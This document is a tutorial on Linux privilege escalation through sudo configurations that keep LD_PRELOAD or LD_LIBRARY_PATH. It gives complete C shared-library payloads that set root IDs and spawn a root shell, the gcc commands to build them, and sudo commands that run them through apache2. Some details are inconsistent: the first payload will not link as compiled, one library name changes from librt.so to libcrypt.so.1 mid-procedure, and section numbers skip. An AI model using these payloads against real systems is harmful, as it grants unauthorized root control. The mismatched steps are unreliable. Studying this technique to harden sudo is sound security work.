## 1. What are environment variables?

Environment variables are values passed from a process to the programs it starts.

For example:
```bash
echo $PATH
echo $HOME
echo $USER
```

They provide information or configuration to programs.

Example:
```text
PATH=/usr/local/bin:/usr/bin:/bin
HOME=/home/user
USER=user
```

A program can read these variables and change its behavior accordingly.

---

# 2. Why are they dangerous with `sudo`?

Normally, `sudo` tries to **clean the environment** before executing a command as another user.

For example:
```text
User environment
      ↓
    sudo
      ↓
sanitized environment
      ↓
root program
```

This is important because some environment variables can change **how a program loads or executes code**.

But `sudo` can be configured to preserve specific variables.

We can check this with:
```bash
sudo -l
```

Look for something like:
```text
env_keep += LD_PRELOAD
env_keep += LD_LIBRARY_PATH
```

Now the situation becomes:
```text
Attacker-controlled environment
             ↓
            sudo
             ↓
     environment preserved
             ↓
       root program
```

That's the dangerous part.

---

# 3. `LD_PRELOAD`

### What is it?

`LD_PRELOAD` is an environment variable used by the Linux dynamic linker.

It specifies a shared object that should be loaded **before other shared libraries**.

For example:

```bash
LD_PRELOAD=/tmp/preload.so program
```

Conceptually:

```text
program starts
     ↓
dynamic linker
     ↓
loads preload.so FIRST
     ↓
loads normal libraries
     ↓
program executes
```

This is powerful because a shared object can contain code that executes when the program starts.

---

# **Exploit Example:**

If `sudo -l` shows that you can run a command and the environment variable `LD_PRELOAD` is not reset or restricted, you can inject your own code into a root process.

1. Create a malicious shared library: named exploit.c
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    setuid(0); // Set User ID to Root
    setgid(0); // Set Group ID to Root
    system("/bin/bash"); // Spawn the shell
}
```

2. Compile it:
```bash
gcc -shared -fPIC -o root_shell.so exploit.c
```

3. Set LD_PRELOAD and execute a vulnerable setuid binary:
```bash
sudo LD_PRELOAD=/tmp/root_shell.so <allowed_command>
```

If the binary doesn’t sanitize LD_PRELOAD, it will execute the malicious code, giving the attacker root access.

The flow is:
```text
User
 ↓
sudo
 ↓
LD_PRELOAD=/tmp/root_shell.so
 ↓
allowed command starts as root
 ↓
dynamic linker loads root_shell.so
 ↓
library initialization code executes
 ↓
code executes with root privileges
```

---

# **Exploit Example:**

### Inspect the user's `sudo` permissions:
```bash
sudo -l
```

Suppose we find something like:
```text
User user may run the following commands:
    (root) /usr/sbin/apache2
```
and the configuration allows `LD_PRELOAD` to be preserved.

Now we have an interesting situation:
```text
Normal user
     ↓
sudo
     ↓
apache2 running as root
```

The question becomes:
> Can we influence how Apache starts?


### Why `LD_PRELOAD` matters here
If `sudo` allows the user-controlled `LD_PRELOAD` variable to reach Apache:
```text
User-controlled environment
          ↓
     sudo apache2
          ↓
 Apache runs as root
          ↓
 Dynamic linker
          ↓
Attacker-controlled .so
```

The shared object is therefore loaded inside a **root process**.

If the shared object contains code that executes during initialization, that code may execute with the privileges of the root process.

### Inspect Apache's shared libraries
```bash
ldd /usr/sbin/apache2
```

`ldd` displays the shared libraries required by the executable.

Example:
```text
libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
libc.so.6    => /lib/x86_64-linux-gnu/libc.so.6
...
```

You can see that there are several shared libraries that `apache2` is using, along with their paths. For demonstration purposes, I am using `libcrypt.so.1` . However, you can choose any of the libraries; just be aware that sometimes you might encounter errors.


### Create a shared object

Now, navigate to the `/tmp` directory and create a shared object using a **malicious C file**:
```C
#define _GNU_SOURCE  
#include <stdio.h>  
#include <unistd.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
      unsetenv("LD_PRELOAD"); // Remove LD_PRELOAD to prevent other libraries from loading  
      setresuid(0,0,0);       // Set user ID to 0 (root)  
      system("/bin/bash -p");  // Execute shell with root privileges  
}
```

For example: `preload.c`

This code is designed to unset an environmental variable, set the user ID to 0 (root), and open a root shell to perform actions as desired. Now, compile `preload.c` using the following command:

```bash
gcc -fPIC -shared -nostartfiles preload.c -o /tmp/libcrypt.so
```

The attacker-controlled library can contain initialization code that executes when the library is loaded.

### run the apache2 with our custom object

Now, set the `LD_PRELOAD` env variable to load our newly created object and run the `apache2` program with `sudo`.
```bash
sudo LD_PRELOAD=/tmp/libcrypt.so /usr/sbin/apache2
```
(We are running `apache2` with our custom object `/tmp/libcrypt.so`)


Conceptually:
```text
Apache starts
      ↓
Dynamic linker
      ↓
Loads malicious .so
      ↓
Initialization code executes
      ↓
Code executes with Apache's privileges
```

> **The dangerous combination is attacker-controlled library loading + privileged execution.**


---

# 7. `LD_LIBRARY_PATH`

The second technique is slightly different.

`LD_LIBRARY_PATH` tells the dynamic linker **where to search for shared libraries**.

For example:

```bash
LD_LIBRARY_PATH=/tmp program
```

Conceptually:

```text
program needs libX.so
        ↓
dynamic linker searches
        ↓
/tmp
        ↓
/usr/lib
        ↓
...
```

We can modify the `LD_LIBRARY_PATH` environment variable to point to a directory we control, which allows us to inject our own shared library.

---

# 8. Finding the libraries a program uses

The `ldd` command is useful:
```bash
ldd /usr/sbin/apache2
```

Example:
```text
librt.so.1   => /lib/librt.so.1
libc.so.6    => /lib/x86_64-linux-gnu/libc.so.6
```

This tells us which shared libraries the executable depends on.

---
# 9. Creating the fake library

Next, navigate to the `/tmp` directory and create a malicious shared library using a **malicious C file**:

```C
#include <stdio.h>  
#include <stdlib.h>  
  
static void hijack() __attribute__((constructor));  
  
void hijack() {  
      unsetenv("LD_LIBRARY_PATH");  
      setresuid(0,0,0);  
      system("/bin/bash -p");  
}
```
named: `library_path.c`

compile the `library_path.c` to create a shared object with the name of one of the listed libraries in `ldd`.
```bash
gcc -fPIC -shared library_path.c -o /tmp/librt.so
```

Now:
```text
/tmp/libcrypt.so.1
```
is our attacker-controlled shared object.

Then:
```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

If `apache2` searches `/tmp` first and loads our library, the code inside the library executes with the privileges of the `sudo` process.

---

# 12. The big picture

I'd summarize the whole section with this diagram:

```text
                 sudo -l
                    │
                    ↓
              env_keep found
                    │
          ┌─────────┴─────────┐
          ↓                   ↓
     LD_PRELOAD         LD_LIBRARY_PATH
          │                   │
          ↓                   ↓
   Load attacker .so     Search attacker
       first             directory first
          │                   │
          └─────────┬─────────┘
                    ↓
           Root program loads
           attacker-controlled
                 library
                    ↓
             Code execution
                    ↓
                   ROOT
```

